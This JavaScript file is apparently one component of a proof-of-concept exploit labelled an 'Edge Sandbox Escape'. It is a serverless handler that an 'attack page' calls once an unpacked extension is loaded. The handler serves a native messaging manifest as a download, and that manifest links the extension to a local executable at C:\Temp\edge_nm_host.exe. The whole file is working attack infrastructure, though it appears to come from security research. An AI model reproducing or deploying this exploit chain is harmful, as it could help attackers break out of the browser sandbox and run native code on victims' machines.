// Vercel serverless function
// Returns NM manifest JSON with the correct extension ID injected
// Called by the attack page after Extensions.loadUnpacked returns the ext_id

export default function handler(req, res) {
  const extId = req.query.ext_id;

  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET");

  if (!extId) {
    return res.status(400).json({ error: "missing ext_id" });
  }

  const manifest = {
    name: "com.researcher.poc",
    description: "Edge Sandbox Escape PoC",
    type: "stdio",
    path: "C:\\Temp\\edge_nm_host.exe",
    allowed_origins: [`chrome-extension://${extId}/`],
  };

  res.setHeader("Content-Type", "application/json");
  res.setHeader(
    "Content-Disposition",
    'attachment; filename="edge_nm_manifest.json"'
  );
  res.status(200).json(manifest);
}
